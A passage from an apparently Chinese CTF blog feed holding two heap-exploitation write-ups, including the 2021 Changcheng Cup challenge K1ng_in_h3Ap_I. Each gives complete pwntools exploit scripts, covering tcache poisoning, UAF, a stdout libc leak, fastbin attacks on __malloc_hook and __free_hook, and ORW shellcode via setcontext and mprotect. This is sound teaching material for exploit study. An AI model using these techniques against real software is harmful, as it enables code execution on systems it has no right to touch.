poisoning</code>修改<code>__free_hook</code>为<code>ROP</code>即可。</li><li><code>ROP</code>思路：将<code>__free_hook</code>修改为<code>setcontext+53</code>,然后利用布置好的内存偏移的值调用<code>mprotect</code>函数修改指定内存权限为<code>rwx</code>，然后执行read函数将<code>ORW</code>读入该内存区域并执行。（<code>mprotect</code>函数修改的内存区域覆盖了读取<code>ORW</code>的<code>ROP</code>所在区域，所以可以执行）</li></ul><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :tcache poisoning + UAF + ORW（setcontext + mprotect）</span><br><span class="hljs-string">@时间        :2021/09/28 09:43:55</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(idx, sz):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; \n&#x27;</span>, str(1))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:\n&#x27;</span>, str(idx))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input size:\n&#x27;</span>, str(sz))<br><br>def delete(idx):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; \n&#x27;</span>, str(2))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:\n&#x27;</span>, str(idx))<br><br>def <span class="hljs-built_in">edit</span>(idx, ct):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; \n&#x27;</span>, str(3))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:\n&#x27;</span>, str(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;input context:\n&#x27;</span>, ct)<br><br>def show(idx):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; \n&#x27;</span>, str(4))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:\n&#x27;</span>, str(idx))<br><br><span class="hljs-comment"># 清理一下tcache bins,减少沙盒对堆的影响，方便调试</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(8):<br>    <span class="hljs-built_in">add</span>(0,0x10)<br><span class="hljs-built_in">add</span>(0,0x40)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(0,0x60)<br><br>log.success(<span class="hljs-string">&quot;*********leak heapbase**********&quot;</span>)<br><span class="hljs-built_in">add</span>(1,0x60)<br><span class="hljs-built_in">add</span>(2,0x60)<br>delete(1)<br>delete(2)<br>show(2)<br><br>heapbase = u64(p.recvuntil(<span class="hljs-string">&#x27;\x55\n&#x27;</span>)[-7:-1].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) &amp; 0xfffffffff000<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;heapbase: &quot;</span> + hex(heapbase))<br><br>log.success(<span class="hljs-string">&quot;*********leak libcbase**********&quot;</span>)<br><span class="hljs-built_in">add</span>(2,0x60)<br><span class="hljs-built_in">edit</span>(1,p64(heapbase + 0x10)) # 指向tcache struct<br><span class="hljs-built_in">add</span>(1,0x60)<br><span class="hljs-built_in">add</span>(3,0x60) # tcache struct <span class="hljs-attribute">size</span>=0x250<br><br><span class="hljs-built_in">edit</span>(3,b<span class="hljs-string">&#x27;A&#x27;</span><span class="hljs-number">*64</span>) # 修改tcache strcut 的计数器<br>delete(3)<br>show(3)<br><br>libc.address = u64(p.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x3ebca0<br>free_hook = libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br>setcontext_53 = libc.symbols[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + 53<br>mprotect = libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;libcbase: &quot;</span> + hex(libc.address))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;free_hook: &quot;</span> + hex(free_hook))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;set_context_53: &quot;</span> + hex(setcontext_53))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;mprotect: &quot;</span> + hex(mprotect))<br><br>log.success(<span class="hljs-string">&quot;*********ORW**********&quot;</span>)<br><br><span class="hljs-built_in">add</span>(4,0x58) # 第一次切割tcache struct<br><span class="hljs-built_in">edit</span>(4,b<span class="hljs-string">&#x27;\x00&#x27;</span><span class="hljs-number">*0</span>x58)<br><span class="hljs-built_in">add</span>(5,0x38) # 第二次切割tcache struct<br><span class="hljs-built_in">edit</span>(5,p64(free_hook)) #设置tcache struct中0x60大小的地址为__free_hook<br><span class="hljs-built_in">add</span>(6,0x58) # <span class="hljs-attribute">idx</span>=6 指向free_hook<br><br><span class="hljs-built_in">add</span>(1,0x30) # 这几个chunk是用来布置偏移量，从而利用setcontext设置寄存器 <br><span class="hljs-built_in">add</span>(2,0x10) <br><span class="hljs-built_in">add</span>(3,0x30) # 该chunk的偏移量范围可以设置r15,rdi,rsi,rbp,rbx,rdx （此处只有rdi,rsi,rdx有用）<br><span class="hljs-built_in">add</span>(4,0x30) # 跟<span class="hljs-attribute">idx</span>=7用户空间大小指针偏移0xa0 该chunk的偏移量范围可以设置 rsp,rcx(进而控制pc)<br><br>fake_stack = free_hook &amp; 0xfffffffff000<br><br><span class="hljs-comment"># 写入用于ORW的shellcode到</span><br>sys_read = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">mov rsi,%d</span><br><span class="hljs-string">mov rdx,0x1000</span><br><span class="hljs-string">mov eax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span> % fake_stack<br><br><span class="hljs-comment"># 当 free 堆块时堆地址作为参数放在 rdi 传入函数中</span><br><br><span class="hljs-comment"># mprotect(fake_stack,0x1000,7)</span><br>mprotect_args = p64(0)  # r15<br>mprotect_args += p64(fake_stack) #rdi<br>mprotect_args += p64(0x1000) # rsi<br>mprotect_args += p64(0) # rbp<br>mprotect_args += p64(0) # rbx<br>mprotect_args += p64(7) # rdx<br><br><br><span class="hljs-built_in">edit</span>(6,p64(setcontext_53) + p64(free_hook + 0x10) + asm(sys_read))<br><span class="hljs-built_in">edit</span>(3,mprotect_args)<br><span class="hljs-built_in">edit</span>(4,p64(free_hook + 8) + p64(mprotect)) # 分别是 rsp、rcx()<br><br>delete(1)<br><br>sleep(0.5)<br><br><span class="hljs-comment"># fd = open(&#x27;/flag&#x27;,O_RDONLY)</span><br><span class="hljs-comment"># read(fd,addr,1024)</span><br><span class="hljs-comment"># write(1,addr,1024)</span><br>orw = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">mov rax, 0x67616c662f ;// /flag</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rsp ;// /flag</span><br><span class="hljs-string">mov rsi, 0 ;// O_RDONLY</span><br><span class="hljs-string">xor rdx, rdx ;</span><br><span class="hljs-string">mov rax, 2 ;// SYS_open</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rax ;// fd </span><br><span class="hljs-string">mov rsi,rsp  ;</span><br><span class="hljs-string">mov rdx, 1024 ;// nbytes</span><br><span class="hljs-string">mov rax,0 ;// SYS_read</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1 ;// fd </span><br><span class="hljs-string">mov rsi, rsp ;// buf</span><br><span class="hljs-string">mov rdx, rax ;// count </span><br><span class="hljs-string">mov rax, 1 ;// SYS_write</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 0 ;// error_code</span><br><span class="hljs-string">mov rax, 60</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br>p.sendline(asm(orw))<br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5 Reference"></a>0x5 Reference</h2><ul><li><a href="https://blog.csdn.net/A951860555/article/details/118268484">https://blog.csdn.net/A951860555/article/details/118268484</a></li><li><a href="https://blog.csdn.net/yongbaoii/article/details/120383873">https://blog.csdn.net/yongbaoii/article/details/120383873</a></li><li><a href="https://www.anquanke.com/post/id/253659#h3-9">https://www.anquanke.com/post/id/253659#h3-9</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>ORW</tag>
      
      <tag>UAF</tag>
      
      <tag>tcache poisoning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021长城杯-K1ng_in_h3Ap_I</title>
    <link href="/2021/11/05/%E9%95%BF%E5%9F%8E%E6%9D%AF2021-K1ng-in-h3Ap-I/"/>
    <url>/2021/11/05/%E9%95%BF%E5%9F%8E%E6%9D%AF2021-K1ng-in-h3Ap-I/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>2021年长城杯的一道pwn题，偏简单。</p><h2 id="0x1-题目信息"><a href="#0x1-题目信息" class="headerlink" title="0x1 题目信息"></a>0x1 题目信息</h2><ul><li><p>使用libc-2.23.so(2.23-0ubuntu11.3)</p></li><li><p>file pwn</p></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>, for GNU/Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span>, BuildID[sha1]=<span class="hljs-number">74</span>c8fe3648c3b483b0a5b43b23e24be1f130696c, stripped<br></code></pre></td></tr></table></figure><ul><li>checksec pwn</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><h2 id="0x2-功能分析"><a href="#0x2-功能分析" class="headerlink" title="0x2 功能分析"></a>0x2 功能分析</h2><ul><li>add: 由于可覆盖idx，所以可以申请任意个堆块，堆块大小限制为0~0xF0，申请成功之后就把地址和堆块大小分别存储在两个数组中；</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">_DWORD *add()<br>&#123;<br>  _DWORD *result; <span class="hljs-regexp">//</span> rax<br>  int idx; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">8</span>h]<br>  int size; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">10</span> )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  puts(<span class="hljs-string">&quot;input size:&quot;</span>);<br>  size = get_Int();<br>  <span class="hljs-keyword">if</span> ( size &lt; <span class="hljs-number">0</span> || size &gt; <span class="hljs-number">0</span>xF0 )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  heap_array[idx] = malloc(size);<br>  result = size_array;<br>  size_array[idx] = size;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>edit：根据index找到堆块地址和堆块大小，然后写入内容，输入函数存在<code>off-by-one</code>漏洞</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">__int64 edit()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">15</span> || !heap_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  puts(<span class="hljs-string">&quot;input context:&quot;</span>);<br>  return Read(heap_array[idx], (unsigned int)size_array[idx]);<span class="hljs-regexp">//</span> off-by-one<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>delete：根据index找到堆块地址，然后释放，没有将指针置为0，存在<code>UAF</code>漏洞</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">void <span class="hljs-keyword">delete</span>()<br>&#123;<br>  int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  puts(<span class="hljs-string">&quot;input index:&quot;</span>);<br>  idx = get_Int();<br>  <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">10</span> || !*((_QWORD *)&amp;heap_array + idx) || !size_array[idx] )<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  free(*((void **)&amp;heap_array + idx));          <span class="hljs-regexp">//</span> UAF<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>magic：打印出printf函数地址的后三字节</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">magic</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> __int64)&amp;printf &amp; <span class="hljs-number">0xFFFFFF</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h2><ul><li>由于没有输出函数，所以无法通过<code>UAF</code>来泄露<code>main_arena + offset</code>，从而获取libcbase，考虑利用<code>stdout</code>来泄露libc；</li><li>根据<code>printf</code>函数（在libc中）地址的后三位，我们可以根据固定偏移量推算出libc中<code>stdout</code>的地址；</li><li>当堆块释放到<code>unsorted bin</code>中时，fd和bk都是<code>main_arena + offset</code>，此时我们利用<code>UAF</code>漏洞修改fd的低2字节（调试发现<code>main_arena</code>的地址和<code>stdout</code>的地址只有最好两字节有差异）为<code>stdout-0x43</code>的地址即可（需要满足size检测）；</li><li>再次申请堆块获取<code>stdout</code>的控制权限,修改flags&#x3D;0xfbad1800，<code>_IO_read_ptr</code>，<code>_IO_read_base</code>和<code>_IO_read_end</code>为0，即可泄露出关于libc的地址；</li><li>然后使用<code>UAF</code>和<code>fastbin attack</code>来修改<code>__malloc_hook</code>和<code>__realloc_hook</code>为<code>realloc</code>和<code>one_gadget</code>。</li></ul><h2 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :fastbin attack ==&gt; stdout泄露libcbase; UAF ==&gt; fastbin attack to malloc_hook realloc_hook</span><br><span class="hljs-string">             好像无需知道printf部分地址也行，因为main_arena应该与stdout的偏移也应该是固定的</span><br><span class="hljs-string">@时间        :2021/09/27 16:59:14</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(idx, sz):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, str(1))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:&#x27;</span>, str(idx))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input size:&#x27;</span>, str(sz))<br><br>def delete(idx):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, str(2))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:&#x27;</span>, str(idx))<br><br>def <span class="hljs-built_in">edit</span>(idx, ct):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, str(3))<br>    p.sendlineafter(<span class="hljs-string">&#x27;input index:&#x27;</span>, str(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;input context:&#x27;</span>, ct)<br><br>def magic():<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, str(666))<br><br>magic()<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>printf_last_3_Bytes = int(p.recv(6),16)<br>stdout_last_3_Bytes = printf_last_3_Bytes + 0x36fe10<br><br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;printf_last_3_Bytes: &quot;</span> + hex(printf_last_3_Bytes))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;stdout_last_3_Bytes: &quot;</span> + hex(stdout_last_3_Bytes))<br><br><span class="hljs-built_in">add</span>(0,0x18)<br><span class="hljs-built_in">add</span>(1,0x20)<br><span class="hljs-built_in">add</span>(2,0x60)<br><span class="hljs-built_in">add</span>(3,0x10)<br><span class="hljs-built_in">edit</span>(0,b<span class="hljs-string">&#x27;A&#x27;</span><span class="hljs-number">*0</span>x18 + b<span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>delete(1)<br>delete(2)<br><span class="hljs-built_in">add</span>(1,0x20)<br><span class="hljs-built_in">edit</span>(2,p16((stdout_last_3_Bytes&amp;0xffff)-0x43) + b<span class="hljs-string">&#x27;\n&#x27;</span>) #必须设置为stdout前0x43字节，才能满足size要求<br><br><span class="hljs-built_in">add</span>(2,0x60)<br><span class="hljs-built_in">add</span>(4,0x60) # <span class="hljs-attribute">idx</span>=4 指向stdout-0x33  <br><br><span class="hljs-comment">#本题中，修改flags为0xfbad1800之后，后面的就没输入进去了？</span><br>payload = b<span class="hljs-string">&#x27;\x00&#x27;</span><span class="hljs-number">*0</span>x33 + p64(0xfbad1800) + p64(0)<span class="hljs-number">*3</span> + b<span class="hljs-string">&#x27;\x00&#x27;</span> + b<span class="hljs-string">&#x27;\n&#x27;</span> <br><span class="hljs-built_in">edit</span>(4,payload)<br><br>libc.address = u64(p.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))-0x3c5600<br>realloc = libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>] # __libc_realloc<br>__malloc_hook = libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one = [0x45226,0x4527a,0xf03a4,0xf1247]<br>onegadget = libc.address + one[1]<br><br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;libc.address: &quot;</span> + hex(libc.address))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;realloc: &quot;</span> + hex(realloc))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;__malloc_hook: &quot;</span> + hex(__malloc_hook))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;onegadget: &quot;</span> + hex(onegadget))<br><br>delete(2)<br><span class="hljs-built_in">edit</span>(2,p64(__malloc_hook - 0x23) + b<span class="hljs-string">&#x27;\n&#x27;</span>) # UAF<br><span class="hljs-built_in">add</span>(5,0x60)<br><span class="hljs-built_in">add</span>(6,0x60) # <span class="hljs-attribute">idx</span>=6 指向 __malloc_hook - 0x23<br><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*(0x13 - 8) + p64(onegadget) + p64(realloc+12) + b<span class="hljs-string">&#x27;\n&#x27;</span><br><span class="hljs-built_in">edit</span>(6,payload)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p,&quot;b __libc_malloc&quot;)</span><br><br><span class="hljs-built_in">add</span>(7,0x10) #触发<br><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h2 id="0x5-Rference"><a href="#0x5-Rference" class="headerlink" title="0x5 Rference"></a>0x5 Rference</h2><ul><li><a href="https://www.jianshu.com/p/27152c14e2e7">https://www.jianshu.com/p/27152c14e2e7</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>UAF</tag>
      
